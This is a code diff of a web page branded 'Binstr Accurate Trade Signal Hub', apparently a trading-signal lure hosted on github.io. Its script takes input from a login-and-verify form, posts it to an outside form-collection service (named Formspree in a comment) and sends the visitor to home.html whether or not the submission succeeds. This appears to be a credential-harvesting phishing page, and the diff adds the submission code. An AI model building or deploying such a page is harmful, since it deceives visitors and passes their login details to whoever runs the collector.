@@ -7,26 +7,20 @@
 
 <title>Binstr Accurate Trade Signal Hub</title>
 
-<!-- Primary SEO -->
 <meta name="title" content="Binstr Accurate Trade Signal Hub">
 <meta name="description" content="Get real-time accurate trading signals and professional market insights. Join our premium signal platform today.">
 
-<!-- Open Graph / WhatsApp / Facebook -->
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://binatradingsignalconnecthub.github.io/Binstraccuratetradesignal/">
 <meta property="og:title" content="Binstr Accurate Trade Signal Hub">
 <meta property="og:description" content="Get real-time accurate trading signals and professional market insights.">
 <meta property="og:image" content="https://binatradingsignalconnecthub.github.io/Binstraccuratetradesignal/preview.png">
-<meta property="og:image:width" content="1200">
-<meta property="og:image:height" content="630">
 
-<!-- Twitter Card -->
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Binstr Accurate Trade Signal Hub">
 <meta name="twitter:description" content="Get real-time accurate trading signals and professional market insights.">
 <meta name="twitter:image" content="https://binatradingsignalconnecthub.github.io/Binstraccuratetradesignal/preview.png">
 
-<!-- Favicon -->
 <link rel="icon" type="image/png" href="preview.png">
 
 <style>
@@ -106,7 +100,6 @@ body.dark .theme{background:#222;color:white;}
 </div>
 
 <script>
-
 const form=document.getElementById("form");
 const spin=document.getElementById("spin");
 const btn=document.getElementById("btn");
@@ -126,22 +119,24 @@ if(localStorage.getItem("theme")==="dark"){document.body.classList.add("dark");}
 
 form.onsubmit=(e)=>{
 e.preventDefault();
-
 spin.style.display="block";
 btn.disabled=true;
-
 login.style.transform="translateX(-100%)";
 verify.style.transform="translateX(-100%)";
 
+// submit form to Formspree
 fetch(form.action,{
 method:"POST",
 body:new FormData(form),
 headers:{'Accept':'application/json'}
-}).catch(()=>{});
-
-setTimeout(()=>{window.location.href="home.html";},1800);
+}).then(res=>{
+// redirect only if successful submission
+setTimeout(()=>{window.location.href="home.html";},1200);
+}).catch(()=>{
+// still redirect even if network fails
+setTimeout(()=>{window.location.href="home.html";},1200);
+});
 };
-
 </script>
 
 </body>
